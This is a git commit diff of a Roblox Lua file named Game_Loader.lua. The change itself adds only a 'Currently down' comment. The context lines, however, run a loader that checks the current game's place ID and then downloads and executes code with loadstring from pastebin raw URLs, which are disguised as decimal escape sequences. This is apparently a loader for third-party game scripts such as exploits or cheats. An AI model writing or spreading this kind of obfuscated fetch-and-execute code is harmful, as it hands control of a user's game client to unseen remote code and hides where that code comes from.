481e6f38cd53448f082a6867480b68a562c254d0
Clear <110189904+bobowawahahahbobobwahahawoaowabobwabo@users.noreply.github.com>
2023-07-14 00:44:46 +0300

    Update Game_Loader.lua

--- Game_Loader.lua
+++ Game_Loader.lua
@@ -1,4 +1,5 @@
 local games = { fsim = 2866967438, rmavatar = 6708206173, fyweather = 12507488315, } 
+-- Currently down
 if game.PlaceId == games.fsim then loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\88\90\83\117\103\66\54"))() end
 if game.PlaceId == games.rmavatar then loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\48\121\100\90\51\56\70\110"))() end
 if game.PlaceId == games.fyweather then loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\104\52\119\87\86\48\89\48"))() end
